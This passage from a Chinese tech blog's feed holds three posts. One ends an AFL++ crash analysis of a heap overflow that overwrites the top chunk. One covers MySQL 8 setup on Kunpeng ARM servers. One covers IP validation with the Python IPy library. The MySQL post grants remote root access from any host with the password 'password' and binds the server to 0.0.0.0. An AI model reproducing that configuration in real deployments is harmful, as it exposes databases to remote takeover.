data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/xxd.png" /></p><p>显然是因为strcat造成溢出覆盖了topchunk，然后在printf调用malloc的时候触发crash。而输入我们是可以自定义的，也就是说我们现在可以控制topchunk的size了，接下来的利用过程就交给各位师傅们了。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210312161833139.png" /></p><h1 id="总结">总结</h1><p>在本文中我们介绍了AFL++的安装和各类工具的使用以帮助我们对Fuzzer生成的crashes进行分类与分析。当然，还有很多自动化分析工具没有介绍，具体可以参阅<code>https://aflplus.plus/docs/sister_projects/#crash-triage-coverage-analysis-and-other-companion-tools</code>。</p><p>在下篇文章中我会学着如何对一些简单的库代码和真实软件编写harness来帮助Fuzzer更好地进行Fuzzing。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
      <tag>System Security</tag>
      
      <tag>afl++</tag>
      
      <tag>afl utils</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华为鲲鹏服务器下MySQL8的安装与远程连接配置</title>
    <link href="/2021/03/10/MySQL8-under-Kunpeng/"/>
    <url>/2021/03/10/MySQL8-under-Kunpeng/</url>
    
    <content type="html"><![CDATA[<h1 id="docker安装">Docker安装</h1><blockquote><p>Docker Version: 20.10.5 Site: <ahref="https://hub.docker.com/r/mysql/mysql-server"class="uri">https://hub.docker.com/r/mysql/mysql-server</a> Ubuntu20.04.2 LTS (GNU/Linux 4.15.0-136-generic aarch64)</p></blockquote><p>Docker的安装就跳过了，直接快进到mysql-server的安装，好消息是mysql官方Docker已经适配了arm64架构，所以直接参照官方文档安装就可以了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql/mysql-server # 默认选择latest<br>docker run --name=mysql1 -d mysql/mysql-server<br>docker ps # 等待初始化完成，starting变为healthy<br>docker logs mysql1 # 监控容器输出<br>docker logs mysql1 2&gt;&amp;1 | grep GENERATED # 初始化完成后查看密码<br>GENERATED ROOT PASSWORD: Axegh3kAJyDLaRuBemecis&amp;EShOs # 生成的随机密码<br>docker exec -it mysql1 mysql -uroot -p # 输入上面生成的随机密码<br>ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;; # 修改root密码<br></code></pre></td></tr></table></figure><h1 id="包管理器安装">包管理器安装</h1><blockquote><p>mysql Ver 8.0.23-0ubuntu0.20.04.1 for Linux on aarch64 ((Ubuntu))</p></blockquote><p>更新源，安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install mysql-server<br>sudo apt install mysql-client<br>sudo apt install libmysqlclient-dev<br>sudo mysql # 查看是否成功<br></code></pre></td></tr></table></figure><h1 id="mysql配置">MySQL配置</h1><p>mysql安装完成后默认是没有密码的,需要先修改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &quot;password&quot;;<br></code></pre></td></tr></table></figure><p>远程连接需要单独配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">注释掉bind-address= 127.0.0.1 或改为0.0.0.0</span><br>sudo service mysql restart # 重启MySQL服务<br></code></pre></td></tr></table></figure><p>添加远程连接的账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create user root@&#x27;%&#x27; identified by &#x27;password&#x27;;<br>grant all privileges on *.* to root@&#x27;%&#x27;;<br>flush privileges;<br></code></pre></td></tr></table></figure><p>最后在华为ECS的安全组配置中开启3306端口就可以远程连接了。</p>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
      <tag>database</tag>
      
      <tag>arm64</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用IPy判断IP地址的合法性</title>
    <link href="/2021/03/02/Use-IPy-to-determine-the-legitimacy-of-an-IP-address/"/>
    <url>/2021/03/02/Use-IPy-to-determine-the-legitimacy-of-an-IP-address/</url>
    
    <content type="html"><![CDATA[<h1 id="ip地址格式规范">ip地址格式规范</h1><h2 id="ipv4">ipv4</h2><p>在CIDR表示法中，前缀显示为4个八位字节，就像传统的IPv4地址一样，后跟”/“斜杠和一个0～32之间的十进制值来描述有效位数。<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="RFC 791; RFC 4632">[1]</span></a></sup></p><blockquote><p>For example, the legacy “Class B” network 172.16.0.0, with an impliednetwork mask of 255.255.0.0, is defined as the prefix 172.16.0.0/16, the“/16” indicating that the mask to extract the network portion of theprefix is a 32-bit value where the most significant 16 bits are ones andthe least significant 16 bits are zeros.<br />Similarly, the legacy “Class C” network number 192.168.99.0 is definedas the prefix 192.168.99.0/24; the most significant 24 bits are ones andthe least significant 8 bits are zeros.</p></blockquote><h2 id="ipv6">ipv6</h2><p>There are three conventional forms for representing IPv6 addresses astext strings:<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="RFC 2373">[2]</span></a></sup></p><ol type="1"><li><p>The preferred form is <code>x:x:x:x:x:x:x:x</code>, where the’x’s are the hexadecimal values of the eight 16-bit pieces of theaddress. Examples:</p><p><code>FEDC:BA98:7654:3210:FEDC:BA98:7654:3210</code></p><p><code>1080:0:0:0:8:800:200C:417A</code></p><p>Note that it is not necessary to write the leading zeros in anindividual field, but there must be at least one numeral in every field(except for the case described in 2.).</p></li><li><p>Due to some methods of allocating certain styles of IPv6addresses, it will be common for addresses to contain long strings ofzero bits. In order to make writing addresses containing zero bitseasier a special syntax is available to compress the zeros. The use of“::” indicates multiple groups of 16-bits of zeros. The “::” can onlyappear once in an address. The “::” can also be used to compress theleading and/or trailing zeros in an address. For example the followingaddresses:</p><p><code>1080:0:0:0:8:800:200C:417A</code> a unicast address</p><p><code>FF01:0:0:0:0:0:0:101</code> a multicast address</p><p><code>0:0:0:0:0:0:0:1</code> the loopback address</p><p><code>0:0:0:0:0:0:0:0</code> the unspecified addresses</p><p>may be represented as:</p><p><code>1080::8:800:200C:417A</code> a unicast address</p><p><code>FF01::101</code> a multicast address</p><p><code>::1</code> the loopback address</p><p><code>::</code> the unspecified addresses</p></li><li><p>An alternative form that is sometimes more convenient whendealing with a mixed environment of IPv4 and IPv6 nodes is<code>x:x:x:x:x:x:d.d.d.d</code>, where the ’x’s are the hexadecimalvalues of the six high-order 16-bit pieces of the address, and the ’d’sare the decimal values of the four low-order 8-bit pieces of the address(standard IPv4 representation). Examples:</p><p><code>0:0:0:0:0:0:13.1.68.3</code></p><p><code>0:0:0:0:0:FFFF:129.144.52.38</code></p><p>or in compressed form:</p><p><code>::13.1.68.3</code></p><p><code>::FFFF:129.144.52.38</code></p></li></ol><p>IPv6地址前缀的文本表示类似于以CIDR表示法编写IPv4地址前缀的方式:IPv6地址/有效位数</p><h1 id="ipy模块的使用">IPy模块的使用</h1><p>安装Ipy模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install IPy<br></code></pre></td></tr></table></figure><p>IPy模块包含IP类，使用它可以处理绝大部分格式的IPv4或IPv6地址<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[3]</span></a></sup>。</p><blockquote><p>It can detect about a dozen different ways of expressing IP addressesand networks, parse them and distinguish between IPv4 and IPv6addresses:</p></blockquote><p>通过version方法来区分出IPv4和IPv6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/8&#x27;</span>).version()<br><span class="hljs-number">4</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;::1&#x27;</span>).version()<br><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>通过strNormal指定不同的wantprefixlen值控制输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/32&#x27;</span>).strNormal()<br><span class="hljs-string">&#x27;10.0.0.0&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span>).strNormal()<br><span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span>).strNormal(<span class="hljs-number">0</span>)<br><span class="hljs-string">&#x27;10.0.0.0&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span>).strNormal(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span>).strNormal(<span class="hljs-number">2</span>)<br><span class="hljs-string">&#x27;10.0.0.0/255.255.255.0&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>IP(<span class="hljs-string">&#x27;10.0.0.0/24&#x27;</span>).strNormal(<span class="hljs-number">3</span>)<br><span class="hljs-string">&#x27;10.0.0.0-10.0.0.255&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>ip = IP(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(ip)<br><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>ip.NoPrefixForSingleIp = <span class="hljs-literal">None</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(ip)<br><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">32</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>ip.WantPrefixLen = <span class="hljs-number">3</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(ip)<br><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><h1 id="实现代码">实现代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> IPy <span class="hljs-keyword">import</span> IP<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_ip</span>(<span class="hljs-params">ip_str</span>):<br><span class="hljs-keyword">try</span>:<br>ip = IP(ip_str)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The address is illegal.&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>ip_str = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the IP address:\n &quot;</span>)<br><span class="hljs-keyword">if</span> is_ip(ip_str):<br>ip = IP(ip_str)<br>version = ip.version()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The address is IPv&quot;</span>, version, sep=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">if</span> ip.<span class="hljs-built_in">len</span>() &gt; <span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Available address segment is:&quot;</span>, ip.strNormal(<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The number of address is:&quot;</span>, ip.<span class="hljs-built_in">len</span>())<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The binary address is:&quot;</span>, ip.strBin())<br><br></code></pre></td></tr></table></figure><h1 id="测试结果">测试结果</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs log">testcase 1<br>Please enter the IP address:<br> 0.0.0.0<br>The address is IPv4<br>The binary address is: 00000000000000000000000000000000<br>---------------------------------<br>testcase 2<br>Please enter the IP address:<br> 255.255.255.255<br>The address is IPv4<br>The binary address is: 11111111111111111111111111111111<br>---------------------------------<br>testcase 3<br>Please enter the IP address:<br> 256.0.1.1<br>The address is illegal.<br>---------------------------------<br>testcase 4<br>Please enter the IP address:<br> 192.168.0.0/24<br>The address is IPv4<br>Available address segment is: 192.168.0.0-192.168.0.255<br>The number of address is: 256<br>---------------------------------<br>testcase 5<br>Please enter the IP address:<br> 192.168.1.1/24<br>The address is illegal.<br>---------------------------------<br>testcase 6<br>Please enter the IP address:<br> ::1/128<br>The address is IPv6<br>The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001<br>---------------------------------<br>testcase 7<br>Please enter the IP address:<br> FEDC:BA98:7654:3210:FEDC:BA98:7654:3210<br>The address is IPv6<br>The binary address is: 11111110110111001011101010011000011101100101010000110010000100001111111011011100101110101001100001110110010101000011001000010000<br>---------------------------------<br>testcase 8<br>Please enter the IP address:<br> 1080::8:800:200C:417A/24<br>The address is illegal.<br>---------------------------------<br>testcase 9<br>Please enter the IP address:<br> FF01::101<br>The address is IPv6<br>The binary address is: 11111111000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001<br>---------------------------------<br>testcase 10<br>Please enter the IP address:<br> ::<br>The address is IPv6<br>The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>---------------------------------<br>testcase 11<br>Please enter the IP address:<br> ::/64<br>The address is IPv6<br>Available address segment is: 0:0:0:0:0:0:0:0-0000:0000:0000:0000:ffff:ffff:ffff:ffff<br>The number of address is: 18446744073709551616<br>---------------------------------<br></code></pre></td></tr></table></figure><h1 id="ipy源码分析">IPy源码分析</h1><blockquote><p>IPy - class and tools for handling of IPv4 and IPv6 addresses andnetworks.</p></blockquote><p>源码版本为1.01 <code>__version__ = '1.01'</code><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[4]</span></a></sup></p><h2 id="ipversion">ipversion</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, INT_TYPES):<br>    <span class="hljs-variable language_">self</span>.ip = <span class="hljs-built_in">int</span>(data)<br>    <span class="hljs-keyword">if</span> ipversion == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ip &lt;= MAX_IPV4_ADDRESS:<br>            ipversion = <span class="hljs-number">4</span><br>        <span class="hljs-keyword">else</span>:<br>            ipversion = <span class="hljs-number">6</span><br>    <span class="hljs-keyword">if</span> ipversion == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ip &gt; MAX_IPV4_ADDRESS:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IPv4 Address can&#x27;t be larger than %x: %x&quot;</span> % (MAX_IPV4_ADDRESS, <span class="hljs-variable language_">self</span>.ip))<br>        prefixlen = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">elif</span> ipversion == <span class="hljs-number">6</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ip &gt; MAX_IPV6_ADDRESS:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IPv6 Address can&#x27;t be larger than %x: %x&quot;</span> % (MAX_IPV6_ADDRESS, <span class="hljs-variable language_">self</span>.ip))<br>        prefixlen = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;only IPv4 and IPv6 supported&quot;</span>)<br></code></pre></td></tr></table></figure><p>根据处理后的ip长度判断类型，其中<code>MAX_IPV4_ADDRESS = 0xffffffff, MAX_IPV6_ADDRESS = 0xffffffffffffffffffffffffffffffff</code></p><h2 id="strbin">strbin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">bits = _ipVersionToLen(<span class="hljs-variable language_">self</span>._ipversion)<br><span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.WantPrefixLen == <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> wantprefixlen == <span class="hljs-literal">None</span>:<br>wantprefixlen = <span class="hljs-number">0</span><br>ret = _intToBin(<span class="hljs-variable language_">self</span>.ip)<br><span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;0&#x27;</span> * (bits - <span class="hljs-built_in">len</span>(ret)) + ret + <span class="hljs-variable language_">self</span>._printPrefix(wantprefixlen)<br></code></pre></td></tr></table></figure><h2 id="strnormal">strnormal</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.WantPrefixLen == <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> wantprefixlen == <span class="hljs-literal">None</span>:<br>wantprefixlen = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>._ipversion == <span class="hljs-number">4</span>:<br>ret = <span class="hljs-variable language_">self</span>.strFullsize(<span class="hljs-number">0</span>) <span class="hljs-comment"># Return a string representation in the non-mangled format.</span><br><span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>._ipversion == <span class="hljs-number">6</span>:<br>ret = <span class="hljs-string">&#x27;:&#x27;</span>.join([<span class="hljs-string">&quot;%x&quot;</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.strFullsize(<span class="hljs-number">0</span>).split(<span class="hljs-string">&#x27;:&#x27;</span>)]])<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;only IPv4 and IPv6 supported&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="len">len</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">bits = _ipVersionToLen(<span class="hljs-variable language_">self</span>._ipversion) <span class="hljs-comment"># Return number of bits in address for a certain IP version.(32 or 128)</span><br>locallen = bits - <span class="hljs-variable language_">self</span>._prefixlen<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span> ** locallen<br></code></pre></td></tr></table></figure><p>范围IP分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">slice</span>):<br><span class="hljs-keyword">return</span> [IP(IPint.__getitem__(<span class="hljs-variable language_">self</span>, x), ipversion=<span class="hljs-variable language_">self</span>._ipversion) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(*key.indices(<span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>)))]<br><span class="hljs-keyword">return</span> IP(IPint.__getitem__(<span class="hljs-variable language_">self</span>, key), ipversion=<span class="hljs-variable language_">self</span>._ipversion)<br></code></pre></td></tr></table></figure><h2 id="getipv4map">getIPv4Map</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>._ipversion != <span class="hljs-number">6</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">self</span>.ip &gt;&gt; <span class="hljs-number">32</span>) != <span class="hljs-number">0xffff</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>ipv4 = <span class="hljs-variable language_">self</span>.ip &amp; MAX_IPV4_ADDRESS<br><span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>._prefixlen != <span class="hljs-number">128</span>:<br>ipv4 = <span class="hljs-string">&#x27;%s/%s&#x27;</span> % (ipv4, <span class="hljs-number">32</span>-(<span class="hljs-number">128</span>-<span class="hljs-variable language_">self</span>._prefixlen))<br><span class="hljs-keyword">return</span> IP(ipv4, ipversion=<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><h2 id="ip输入格式检测">IP输入格式检测</h2><p>解析字符串并返回相应的整数型IP地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseAddress</span>(<span class="hljs-params">ipstr, ipversion=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        hexval = <span class="hljs-built_in">int</span>(ipstr, <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        hexval = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        intval = <span class="hljs-built_in">int</span>(ipstr, <span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        intval = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> ipstr.startswith(<span class="hljs-string">&#x27;0x&#x27;</span>) <span class="hljs-keyword">and</span> hexval <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> hexval &gt; MAX_IPV6_ADDRESS:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IP Address can&#x27;t be larger than %x: %x&quot;</span> % (MAX_IPV6_ADDRESS, hexval))<br>        <span class="hljs-keyword">if</span> hexval &lt;= MAX_IPV4_ADDRESS:<br>            <span class="hljs-keyword">return</span> (hexval, <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> (hexval, <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">if</span> ipstr.find(<span class="hljs-string">&#x27;:&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> (_parseAddressIPv6(ipstr), <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(ipstr) == <span class="hljs-number">32</span> <span class="hljs-keyword">and</span> hexval <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># assume IPv6 in pure hexadecimal notation</span><br>        <span class="hljs-keyword">return</span> (hexval, <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">elif</span> ipstr.find(<span class="hljs-string">&#x27;.&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (intval <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> intval &lt; <span class="hljs-number">256</span> <span class="hljs-keyword">and</span> ipversion != <span class="hljs-number">6</span>):<br>        <span class="hljs-comment"># assume IPv4  (&#x27;127&#x27; gets interpreted as &#x27;127.0.0.0&#x27;)</span><br>        <span class="hljs-built_in">bytes</span> = ipstr.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>) &gt; <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IPv4 Address with more than 4 bytes&quot;</span>)<br>        <span class="hljs-built_in">bytes</span> += [<span class="hljs-string">&#x27;0&#x27;</span>] * (<span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>))<br>        <span class="hljs-built_in">bytes</span> = [<span class="hljs-built_in">int</span>(x) 